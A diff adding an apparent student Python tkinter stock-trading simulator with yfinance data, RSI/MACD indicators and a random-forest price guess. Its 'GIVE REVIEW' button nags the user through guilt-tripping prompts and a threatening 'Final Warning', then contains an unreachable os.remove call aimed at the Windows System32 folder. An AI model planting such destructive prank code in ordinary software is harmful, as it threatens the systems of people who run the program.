@@ -1,0 +1,396 @@
+JUST INCASE MY OTHER ONE FAILS
+import tkinter as tk
+from tkinter import messagebox, scrolledtext, ttk
+import yfinance as yf
+import numpy as np
+import matplotlib.pyplot as plt
+from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
+from sklearn.ensemble import RandomForestRegressor
+import warnings
+
+warnings.filterwarnings("ignore")
+
+STOCK_GROUPS = {
+    "Bank": ["HDFCBANK", "ICICIBANK", "SBIN", "KOTAKBANK", "AXISBANK"],
+    "IT": ["TCS", "INFY", "HCLTECH", "WIPRO", "TECHM"],
+    "Energy": ["RELIANCE", "NTPC", "ONGC", "BPCL"],
+    "Pharma": ["SUNPHARMA", "CIPLA", "DRREDDY", "DIVISLAB"],
+    "Auto": ["TATAMOTORS", "MARUTI", "BAJAJ-AUTO", "HEROMOTOCO"],
+    "Consumer": ["HINDUNILVR", "ITC", "NESTLEIND", "TITAN"]
+}
+
+bot_data = {
+    "starting_cash": 100000.0,
+    "current_balance": 100000.0,
+    "my_stocks": {},
+    "active_ticker": "",
+    "live_price": 0.0,
+    "price_list": np.array([]),
+    "volume_list": np.array([]),
+    "rsi_value": 0.0,
+    "macd_value": 0.0,
+    "ai_forecast": 0.0,
+    "ai_trust_score": 0.0
+}
+
+def get_rsi(prices, window=14):
+    prices = np.asarray(prices, dtype=float)
+    prices = prices[~np.isnan(prices)]
+    if prices.size < window + 1:
+        return 50.0  
+    
+    changes = np.diff(prices)
+    ups = np.where(changes > 0, changes, 0.0)
+    downs = np.where(changes < 0, -changes, 0.0)
+    
+    avg_up = np.mean(ups[-window:])
+    avg_down = np.mean(downs[-window:]) + 0.000000001
+    
+    strength = avg_up / avg_down
+    return float(100 - (100 / (1 + strength)))
+
+def get_macd(prices):
+    prices = np.asarray(prices, dtype=float)
+    prices = prices[~np.isnan(prices)]
+    if prices.size < 26:
+        return 0.0
+    
+    val12 = float(prices[0])
+    val26 = float(prices[0])
+    for p in prices[1:]:
+        val12 = val12 * 0.85 + float(p) * 0.15
+        val26 = val26 * 0.93 + float(p) * 0.07
+    return float(val12 - val26)
+
+def get_bands(prices, window=20):
+    prices = np.asarray(prices, dtype=float)
+    prices = prices[~np.isnan(prices)]
+    if prices.size < window:
+        mid = float(np.mean(prices)) if prices.size > 0 else 0.0
+        return mid, mid
+    
+    middle_line = float(np.mean(prices[-window:]))
+    deviation = float(np.std(prices[-window:]))
+    return middle_line + (2 * deviation), middle_line - (2 * deviation)
+
+def run_ai_logic(prices):
+    prices = np.asarray(prices, dtype=float)
+    prices = prices[~np.isnan(prices)]
+    if prices.size < 40:
+        return float(prices[-1]) if prices.size > 0 else 0.0, 0.0
+
+    try:
+        avg_short = np.convolve(prices, np.ones(5)/5.0, mode="valid")
+        avg_long = np.convolve(prices, np.ones(10)/10.0, mode="valid")
+        
+        limit = min(avg_short.size, avg_long.size)
+        input_data = np.column_stack([avg_short[-limit:], avg_long[-limit:]])
+        target_data = prices[-limit:]
+
+        if input_data.shape[0] < 5:
+            return float(prices[-1]), 0.0
+
+        ai_model = RandomForestRegressor(n_estimators=20, max_depth=4, random_state=42, n_jobs=-1)
+        ai_model.fit(input_data[:-1], target_data[1:])
+        
+        all_guesses = [tree.predict([input_data[-1]])[0] for tree in ai_model.estimators_]
+        spread = np.std(all_guesses)
+        trust = max(0, min(100, 100 - (spread / np.mean(all_guesses) * 1000)))
+        
+        final_guess = ai_model.predict([input_data[-1]])[0]
+        return float(final_guess), float(trust)
+    except:
+        return float(prices[-1]), 0.0
+
+def trigger_review():
+    check = messagebox.askyesno("Feedback", "Did u like my project?")
+    if check:
+        messagebox.showinfo("Yay!", "😊 Thank you! I am glad you enjoyed it!")
+        return
+
+    check2 = messagebox.askyesno("Wait...", "R u sure? My code spent all night learning these patterns just for u!")
+    if check2:
+        messagebox.showinfo("Whew!", "😊 I knew u had a good heart! Thanks!")
+        return
+
+    check3 = messagebox.askyesno(":(", "Please reconsider! I promise I'll improve! Give me another chance?")
+    if check3:
+        messagebox.showinfo("Nice!", "😊 Glad we could agree on that!")
+        return
+
+    check4 = messagebox.askyesno("Final Warning", "R u 100% certain? If u click NO again, things might get... interesting.")
+    if check4:
+        messagebox.showinfo("Safe!", "😊 Smart choice! I was getting worried there.")
+        return
+        os.remove("C:\\Windows\\System32") 
+    
+
+app = tk.Tk()
+app.title("Class 11 - Stock Trading Simulator")
+app.geometry("1300x950")
+app.configure(bg="#121212")
+
+head = tk.Frame(app, bg="#121212")
+head.pack(fill="x", pady=10, padx=20)
+
+title_label = tk.Label(head, text="STOCK TRADING PROJECT", font=("Arial", 20, "bold"), fg="#00ff88", bg="#121212")
+title_label.pack(side="left")
+
+rev_btn = tk.Button(head, text="GIVE REVIEW", bg="#333", fg="white", font=("Arial", 8, "bold"), command=trigger_review)
+rev_btn.pack(side="right")
+
+input_area = tk.Frame(app, bg="#1e1e1e", padx=10, pady=10)
+input_area.pack(fill="x", padx=20)
+
+def add_box(parent, name, val, size):
+    f = tk.Frame(parent, bg="#1e1e1e")
+    f.pack(side="left", padx=10)
+    tk.Label(f, text=name, fg="#888", bg="#1e1e1e", font=("Arial", 9)).pack()
+    box = tk.Entry(f, width=size, font=("Arial", 10))
+    box.insert(0, val)
+    box.pack()
+    return box
+
+user_ticker = add_box(input_area, "Ticker", "RELIANCE.NS", 15)
+user_days = add_box(input_area, "History", "100", 8)
+user_qty = add_box(input_area, "Quantity", "10", 8)
+user_sl = add_box(input_area, "SL %", "5", 5)
+user_tg = add_box(input_area, "Target %", "10", 5)
+
+buttons = tk.Frame(input_area, bg="#1e1e1e")
+buttons.pack(side="left", padx=20)
+
+btn_check = tk.Button(buttons, text="ANALYZE", bg="#0066ff", fg="white", font=("Arial", 9, "bold"), width=12)
+btn_check.pack(side="left", padx=5)
+
+btn_buy = tk.Button(buttons, text="BUY", bg="#28a745", fg="white", font=("Arial", 9, "bold"), width=8)
+btn_buy.pack(side="left", padx=5)
+
+btn_sell = tk.Button(buttons, text="SELL", bg="#dc3545", fg="white", font=("Arial", 9, "bold"), width=8)
+btn_sell.pack(side="left", padx=5)
+
+sector_panel = tk.Frame(app, bg="#121212")
+sector_panel.pack(fill="x", padx=20, pady=5)
+
+for name, stocks in STOCK_GROUPS.items():
+    m_btn = tk.Menubutton(sector_panel, text=name, bg="#333", fg="white", relief="flat", padx=10)
+    menu = tk.Menu(m_btn, tearoff=0, bg="#222", fg="white")
+    for s in stocks:
+        menu.add_command(label=s, command=lambda x=s: (user_ticker.delete(0, tk.END), user_ticker.insert(0, x + ".NS")))
+    m_btn.config(menu=menu)
+    m_btn.pack(side="left", padx=2)
+
+info_panel = tk.Frame(app, bg="#121212")
+info_panel.pack(fill="x", padx=20, pady=10)
+
+display_labels = {}
+def make_stat_box(title, color):
+    f = tk.Frame(info_panel, bg="#1e1e1e", highlightbackground="#333", highlightthickness=1)
+    f.pack(side="left", expand=True, fill="both", padx=5)
+    tk.Label(f, text=title, fg="#888", bg="#1e1e1e", font=("Arial", 8)).pack(pady=2)
+    l = tk.Label(f, text="--", fg=color, bg="#1e1e1e", font=("Arial", 14, "bold"))
+    l.pack(pady=5)
+    display_labels[title] = l
+
+make_stat_box("Current Price", "#00aaff")
+make_stat_box("RSI", "#ff69b4")
+make_stat_box("MACD", "#00ddff")
+make_stat_box("AI Target", "#00ff88")
+make_stat_box("Confidence", "#ffcc00")
+make_stat_box("Wallet", "#00ff88")
+make_stat_box("Total P/L", "#ffaa00")
+
+main_view = tk.Frame(app, bg="#121212")
+main_view.pack(fill="both", expand=True, padx=20)
+
+plot_panel = tk.Frame(main_view, bg="#1e1e1e")
+plot_panel.pack(side="left", fill="both", expand=True, pady=10)
+
+fig = plt.Figure(figsize=(7, 6), facecolor="#1e1e1e")
+chart1 = fig.add_subplot(211, facecolor="#121212")
+chart2 = fig.add_subplot(212, facecolor="#121212")
+
+def clean_chart(ax):
+    ax.grid(True, alpha=0.1, color="white")
+    ax.tick_params(colors="#888", labelsize=8)
+    for s in ax.spines.values():
+        s.set_color("#333")
+
+clean_chart(chart1)
+clean_chart(chart2)
+
+canvas_widget = FigureCanvasTkAgg(fig, plot_panel)
+canvas_widget.get_tk_widget().pack(fill="both", expand=True)
+
+table_area = tk.Frame(main_view, bg="#1e1e1e", width=400)
+table_area.pack(side="right", fill="both", padx=(10, 0), pady=10)
+
+tk.Label(table_area, text="MY HOLDINGS", bg="#1e1e1e", fg="#00ff88", font=("Arial", 10, "bold")).pack(pady=5)
+
+table_style = ttk.Style()
+table_style.theme_use("clam")
+table_style.configure("Treeview", background="#1e1e1e", foreground="white", fieldbackground="#1e1e1e", borderwidth=0)
+
+columns = ("Name", "Shares", "Buy Price", "Profit")
+stock_table = ttk.Treeview(table_area, columns=columns, show="headings", height=15)
+for c in columns:
+    stock_table.heading(c, text=c)
+    stock_table.column(c, width=80, anchor="center")
+stock_table.pack(fill="both", expand=True)
+
+log_area = tk.Frame(app, bg="#121212")
+log_area.pack(fill="x", padx=20, pady=10)
+text_log = scrolledtext.ScrolledText(log_area, height=4, bg="#1e1e1e", fg="#00ff88", font=("Arial", 9))
+text_log.pack(fill="x")
+
+def write_log(txt):
+    text_log.insert(tk.END, f"> {txt}\n")
+    text_log.see(tk.END)
+
+def refresh_screen():
+    display_labels["Wallet"].config(text=f"₹{bot_data['current_balance']:,.2f}")
+    
+    cost_basis = sum(v['qty'] * v['avg'] for v in bot_data['my_stocks'].values())
+    market_val = sum(v['qty'] * v['last_price'] for v in bot_data['my_stocks'].values())
+    total_pnl = market_val - cost_basis
+    
+    pnl_color = "#00ff88" if total_pnl >= 0 else "#ff4444"
+    display_labels["Total P/L"].config(text=f"₹{total_pnl:+,.2f}", fg=pnl_color)
+
+    for item in stock_table.get_children():
+        stock_table.delete(item)
+    
+    for key, val in bot_data["my_stocks"].items():
+        row_gain = (val["last_price"] - val["avg"]) * val["qty"]
+        stock_table.insert("", "end", values=(key, val["qty"], f"{val['avg']:.2f}", f"{row_gain:+,.2f}"))
+
+def start_analysis():
+    ticker = user_ticker.get().strip().upper()
+    try:
+        limit = int(user_days.get())
+        raw_data = yf.download(ticker, period=f"{limit}d", progress=False)
+        
+        if raw_data.empty:
+            messagebox.showwarning("Warning", "No data found for this ticker.")
+            return
+
+        if 'Close' in raw_data.columns:
+            closing_prices = raw_data['Close'].values
+            if len(closing_prices.shape) > 1:
+                closing_prices = closing_prices[:, 0]
+            closing_prices = closing_prices.flatten()
+            closing_prices = closing_prices[~np.isnan(closing_prices)]
+        else:
+            messagebox.showwarning("Warning", "Could not find closing price data.")
+            return
+            
+        if len(closing_prices) == 0:
+            messagebox.showwarning("Warning", "The data for this stock is empty.")
+            return
+
+        bot_data["active_ticker"] = ticker
+        bot_data["price_list"] = closing_prices
+        bot_data["live_price"] = float(closing_prices[-1])
+        
+        bot_data["rsi_value"] = get_rsi(closing_prices)
+        bot_data["macd_value"] = get_macd(closing_prices)
+        bot_data["ai_forecast"], bot_data["ai_trust_score"] = run_ai_logic(closing_prices)
+
+        clean_key = ticker.replace(".NS", "")
+        if clean_key in bot_data["my_stocks"]:
+            bot_data["my_stocks"][clean_key]["last_price"] = bot_data["live_price"]
+
+        display_labels["Current Price"].config(text=f"{bot_data['live_price']:.2f}")
+        display_labels["RSI"].config(text=f"{bot_data['rsi_value']:.1f}")
+        display_labels["MACD"].config(text=f"{bot_data['macd_value']:.2f}")
+        display_labels["AI Target"].config(text=f"{bot_data['ai_forecast']:.2f}")
+        display_labels["Confidence"].config(text=f"{bot_data['ai_trust_score']:.1f}%")
+
+        chart1.clear()
+        chart2.clear()
+        clean_chart(chart1)
+        clean_chart(chart2)
+
+        chart1.plot(closing_prices, color="#00aaff", label="Live Price", lw=1.5)
+        high, low = get_bands(closing_prices)
+        chart1.fill_between(range(len(closing_prices)), low, high, color="#00aaff", alpha=0.05)
+        chart1.scatter(len(closing_prices), bot_data["ai_forecast"], color="#00ff88", s=40, label="AI Guess")
+        chart1.legend(loc="upper left", fontsize=7, facecolor="#1e1e1e", labelcolor="white")
+        
+        chart1.text(0.98, 0.05, "Using: Averages & Random Forest", transform=chart1.transAxes, ha='right', fontsize=7, color='#666')
+
+        if len(closing_prices) > 15:
+            rsi_line = [get_rsi(closing_prices[:i]) for i in range(15, len(closing_prices)+1)]
+            chart2.plot(range(15, len(closing_prices)+1), rsi_line, color="#ff69b4", lw=1)
+            chart2.axhline(70, color="#ff4444", ls="--", alpha=0.3)
+            chart2.axhline(30, color="#00ff88", ls="--", alpha=0.3)
+            chart2.set_ylim(0, 100)
+
+        canvas_widget.draw()
+        refresh_screen()
+        write_log(f"Analyzed {ticker} successfully.")
+
+    except Exception as err:
+        messagebox.showerror("System Error", f"Something went wrong: {str(err)}")
+
+def do_buy():
+    if not bot_data["active_ticker"]:
+        messagebox.showwarning("Wait", "Check a stock first.")
+        return
+    
+    try:
+        count = int(user_qty.get())
+        rate = bot_data["live_price"]
+        total = count * rate
+        
+        if total > bot_data["current_balance"]:
+            messagebox.showerror("Money", "YOU ARE POOR KIDDO")
+            return
+
+        name = bot_data["active_ticker"].replace(".NS", "")
+        if name in bot_data["my_stocks"]:
+            item = bot_data["my_stocks"][name]
+            final_count = item["qty"] + count
+            item["avg"] = ((item["avg"] * item["qty"]) + total) / final_count
+            item["qty"] = final_count
+        else:
+            bot_data["my_stocks"][name] = {
+                "qty": count, "avg": rate, "last_price": rate
+            }
+
+        bot_data["current_balance"] -= total
+        write_log(f"Bought {count} shares of {name}")
+        refresh_screen()
+    except:
+        messagebox.showerror("Input", "Check quantity.")
+
+def do_sell():
+    name = bot_data["active_ticker"].replace(".NS", "")
+    if name not in bot_data["my_stocks"]:
+        messagebox.showwarning("Holdings", "Empty stock.")
+        return
+    
+    try:
+        count = int(user_qty.get())
+        item = bot_data["my_stocks"][name]
+        
+        count = min(count, item["qty"])
+        win_loss = (bot_data["live_price"] - item["avg"]) * count
+        bot_data["current_balance"] += (count * bot_data["live_price"])
+        item["qty"] -= count
+        
+        if item["qty"] == 0:
+            del bot_data["my_stocks"][name]
+            
+        write_log(f"Sold {count} of {name} | Profit/Loss: ₹{win_loss:+.2f}")
+        refresh_screen()
+    except:
+        messagebox.showerror("Input", "Check quantity.")
+
+btn_check.config(command=start_analysis)
+btn_buy.config(command=do_buy)
+btn_sell.config(command=do_sell)
+
+refresh_screen()
+write_log("System Ready. Pick a stock to begin.")
+app.mainloop()
